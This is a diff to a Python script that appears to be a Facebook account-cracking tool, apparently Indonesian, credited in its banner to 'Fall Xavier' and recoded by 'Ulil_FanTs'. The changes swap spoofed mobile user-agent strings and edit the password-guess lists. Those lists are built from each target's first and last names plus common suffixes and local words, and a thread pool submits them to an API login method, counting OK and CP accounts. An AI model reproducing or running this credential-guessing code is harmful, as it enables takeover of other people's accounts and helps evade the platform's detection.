@@ -97,7 +97,7 @@ for z in range(200):
 for xcTeam in range(1000):
 	rr = random.randint
 	rc = random.choice
-	ngentot1 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
+	ngentot1 = f"Mozilla/5.0 (Linux; Android 12; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
 	if ngentot1 in ngentott:pass
 	else:ngentott.append(ngentot1)
 	ngentot2 = f"Dalvik/2.1.0 (Android 13; SM-S918B Build/TP1A.220624.014.{str(rr(111111,199999))}.001) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/ SM-S918B;FBSV/13;FBCA"
@@ -106,7 +106,7 @@ for xcTeam in range(1000):
 	ngentot3 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
 	if ngentot3 in ngentott:pass
 	else:ngentott.append(ngentot3)
-	ngentot4 = f"Mozilla/5.0 (Linux; Android 11; RMX1971 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.32 Chrome/112.0.5615.135 Mobile Safari/537.36"
+	ngentot4 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
 	if ngentot4 in ngentott:pass
 	else:ngentott.append(ngentot4)
 
@@ -175,14 +175,14 @@ class Logo:
 	###----------[ LOGO ]---------- ###
 	def logonya(self):
 		self.bersihkan_layar()
-		prints(Panel(f"""{color_text}
-{B2}┈┈┈┈┈┈▕▔╲         
-{B2}┈┈┈┈┈┈┈▏▕              {B2}╭──────────────────────╮
-{B2}┈┈┈┈┈┈┈▏▕▂▂▂           {B2}│ {P2}Author : Fall Xavier {B2}│
-{B2}▂▂▂▂▂▂╱┈▕▂▂▂▏          {B2}╰──────────────────────╯
-{B2}▉▉▉▉▉┈┈┈▕▂▂▂▏          {B2}╭────────────────────────────╮
-{B2}▉▉▉▉▉┈┈┈▕▂▂▂▏          {B2}│ {P2}Recode By :{B2} Ulil_FanTs{B2}     │
-{B2}▔▔▔▔▔▔╲▂▕▂▂▂▏          {B2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
+		prints(Panel(f"""{color_text}{B2}  ....……._______________, ,____
+{B2}  ....……/ `—___________—-_____] – - – - – - – - ░ ▒▓▓█D
+{B2}  …../_==o;;;;;;;;_______.:/
+{B2}  …..), —.(_(__) /
+{B2}  ….// (..) ), —-”        ╔╦╦╦═╦╗╔═╦═╦══╦═╗
+{B2}  …//___//                ║║║║╩╣╚╣═╣║║║║║╩╣ BROO.....
+{B2}  //___//                 ╚══╩═╩═╩═╩═╩╩╩╩═╝    By UlilFants
+{B2}.//___//""",width=80,style=f"{color_panel}"))
 	
 	
 	
@@ -565,17 +565,16 @@ class Crack:
 								pwx.append(depan+"321")
 								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
-								pwx.append("ganteng banget")
+								pwx.append("ganteng")
 								pwx.append("sayangku")
-								pwx.append("ayangku")
+								pwx.append("ganteng123")
 								pwx.append("katasandi")
-								pwx.append("surabaya")
-								pwx.append("free fire")
+								pwx.append("pekalongan")
+								pwx.append("semarang")
 						else:
 							if len(depan)<3:
 								pwx.append(nama)
 								pwx.append(nama+"123")
-								pwx.append(nama+"01")
 								pwx.append(nama+"321")
 							else:
 								pwx.append(nama)
@@ -583,10 +582,9 @@ class Crack:
 								pwx.append(depan+"321")
 								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
-								pwx.append(depan+"01")
 								pwx.append("kata sandi")
-								pwx.append("surabaya city")
-								pwx.append("free firee")
+								pwx.append("pekalongan")
+								pwx.append("semarang")
 							belakang = nama.split(" ")[1]
 							if len(belakang)<3:
 								pwx.append(depan+belakang)
@@ -594,26 +592,23 @@ class Crack:
 								pwx.append(depan+belakang+"321")
 								pwx.append(depan+belakang+"1234")
 								pwx.append(depan+belakang+"12345")
-								pwx.append(depan+belakang+"TTL")
 							else:
 								pwx.append(depan+belakang)
 								pwx.append(belakang+"123")
 								pwx.append(belakang+"321")
 								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
-								pwx.append(belakang+"0105999")
-								pwx.append("apa sandinya")
-								pwx.append("hayolo09")
+								pwx.append("kontol")
+								pwx.append("kontol123")
 								pwx.append("bismillah")
 								pwx.append("mobile legends")
-								pwx.append("Boyah123")
-								pwx.append("089*********")
-								pwx.append("bangkalan")
-								pwx.append("mantan kontol")
+								pwx.append("batang")
+								pwx.append("pemalang")
+								pwx.append("paninggaran")
 						fall.submit(self.metode_api,user,pwx)
 					except:
 						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{B2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {B2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
+		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
 		sys.exit()
 							
 	###----------[ METODE API ]---------- ###
